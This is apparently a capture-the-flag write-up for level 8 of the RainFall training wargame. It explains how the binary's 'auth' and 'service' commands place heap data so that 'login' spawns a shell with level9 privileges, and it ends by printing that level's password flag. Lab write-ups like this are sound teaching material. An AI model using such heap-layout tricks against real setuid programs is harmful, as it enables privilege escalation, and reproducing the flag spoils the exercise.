@@ -1,0 +1,47 @@
+
+level8@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+ls
+(nil), (nil) 
+pwd
+(nil), (nil) 
+vweoivhwoehvowehvowief
+(nil), (nil) 
+ewjfpwejfoew
+(nil), (nil) 
+
+[loop]
+
+Program has 2 globals: auth and service
+
+Commands:
+    - auth [name]: alloc 4 oct on the heap, if name < 30, it's copied on auth
+    - service [name]: use strdup to copy a str on the heap, stores the address on service
+    - login: if auth + 32 is not null -> opens the shell
+    - reset: free(auth)
+
+Watching the memory addresses, we can see:
+- auth q = 0x804a008
+- service AAAABBBB = 0x804a018
+--> The gap is 16 oct
+- By calling service a second time, strdup alloc a new bloc -> 0x804a028
+--> This is exactly at auth + 32
+
+level8@RainFall:~$ ./level8 
+(nil), (nil) 
+auth yes
+0x804a008, (nil) 
+service AAAABBBB 
+0x804a008, 0x804a018 
+service AAAABBBB
+0x804a008, 0x804a028 
+login
+$ whoami
+level9
+$ cd ../level9
+$ cat .pass
+c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
